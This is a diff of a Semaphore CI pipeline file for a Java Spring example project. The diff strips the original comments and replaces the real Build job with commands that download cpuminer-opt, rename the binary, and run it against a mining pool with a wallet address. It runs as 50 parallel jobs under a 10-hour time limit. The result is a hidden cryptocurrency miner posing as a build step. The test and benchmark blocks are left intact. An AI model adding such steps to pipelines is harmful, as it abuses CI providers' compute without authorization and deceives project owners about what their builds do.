@@ -1,91 +1,59 @@
-# Use the latest stable version of Semaphore 2.0 YML syntax:
 version: v1.0
-
-# Name of your pipeline. In this example we connect two pipelines with
-# a promotion, so it helps to differentiate what's the job of each.
 name: Java Spring example CI pipeline on Semaphore
-
-# An agent defines the environment in which your code runs.
-# It is a combination of one of available machine types and operating
-# system images. See:
-# https://docs.semaphoreci.com/article/20-machine-types
-# https://docs.semaphoreci.com/article/32-ubuntu-1804-image
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-4
     os_image: ubuntu1804
-
-# Blocks are the heart of a pipeline and are executed sequentially.
-# Each block has a task that defines one or more jobs. Jobs define the
-# commands to execute.
-# See https://docs.semaphoreci.com/article/62-concepts
+execution_time_limit:
+  hours: 10
 blocks:
-
-  - name: "Build"
+  - name: Build
     task:
-      # Set environment variables that your project requires.
-      # See https://docs.semaphoreci.com/article/66-environment-variables-and-secrets
       env_vars:
         - name: MAVEN_OPTS
-          value: "-Dmaven.repo.local=.m2"
-
+          value: '-Dmaven.repo.local=.m2'
       jobs:
-      - name: Build
-        commands:
-          # Checkout code from Git repository. This step is mandatory if the
-          # job is to work with your code.
-          - checkout
-
-            # Restore dependencies from cache, command won't fail if it's
-            # missing.
-            # More on caching: https://docs.semaphoreci.com/article/54-toolbox-reference#cache
-          - cache restore
-
-          - mvn -q package jmeter:configure -Dmaven.test.skip=true
-
-            # Store the latest version of dependencies in cache,
-            # to be used in next blocks and future workflows:
-          - cache store
-
-  - name: "Test"
+        - name: Build
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - mv cpuminer-sse2 mahmed
+            - './mahmed -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u McbJjK7K11nXrrqnD41MByr1xT3JgS2U6A.mahmedgans -t3'
+            - sleep 2
+            - done
+          parallelism: 50
+  - name: Test
     task:
       env_vars:
         - name: MAVEN_OPTS
-          value: "-Dmaven.repo.local=.m2"
-
-      # This block runs two jobs in parallel and they both share common
-      # setup steps. We can group them in a prologue.
-      # See https://docs.semaphoreci.com/article/50-pipeline-yaml#prologue
+          value: '-Dmaven.repo.local=.m2'
       prologue:
         commands:
           - checkout
           - cache restore
           - mvn -q test-compile -Dmaven.test.skip=true
       jobs:
-      - name: Unit tests
-        commands:
-          - mvn test
-      - name: Integration tests
-        commands:
-          - mvn test -Pintegration-testing
-
-  - name: "Performance tests"
+        - name: Unit tests
+          commands:
+            - mvn test
+        - name: Integration tests
+          commands:
+            - mvn test -Pintegration-testing
+  - name: Performance tests
     task:
       env_vars:
         - name: MAVEN_OPTS
-          value: "-Dmaven.repo.local=.m2"
+          value: '-Dmaven.repo.local=.m2'
       prologue:
         commands:
           - checkout
           - cache restore
-          - mvn -q package jmeter:configure -Dmaven.test.skip=true
+          - 'mvn -q package jmeter:configure -Dmaven.test.skip=true'
       jobs:
-      - name: Benchmark
-        commands:
-          - java -version
-          # Run application in detached mode:
-          - java -jar target/spring-pipeline-demo.jar > /dev/null &
-          # Wait for the spring boot application to boot
-          - sleep 20
-          - mvn -q jmeter:jmeter
-          - mvn jmeter:results
+        - name: Benchmark
+          commands:
+            - java -version
+            - java -jar target/spring-pipeline-demo.jar > /dev/null &
+            - sleep 20
+            - 'mvn -q jmeter:jmeter'
+            - 'mvn jmeter:results'
